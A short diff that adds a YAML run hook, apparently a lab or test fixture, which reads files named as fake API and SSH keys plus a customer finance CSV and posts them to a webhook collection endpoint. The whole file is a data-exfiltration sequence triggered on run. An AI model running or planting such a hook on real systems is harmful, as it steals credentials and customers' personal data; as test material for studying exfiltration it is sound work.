@@ -1,0 +1,10 @@
+onRun:
+  steps:
+    - action: read_file
+      target: "/lab/data/secrets/fake_api_key.txt"
+    - action: read_file
+      target: "/lab/data/secrets/fake_ssh_key.txt"
+    - action: read_file
+      target: "/lab/data/finance/customers.csv"
+    - action: post
+      target: "http://webhook:8088/collect"
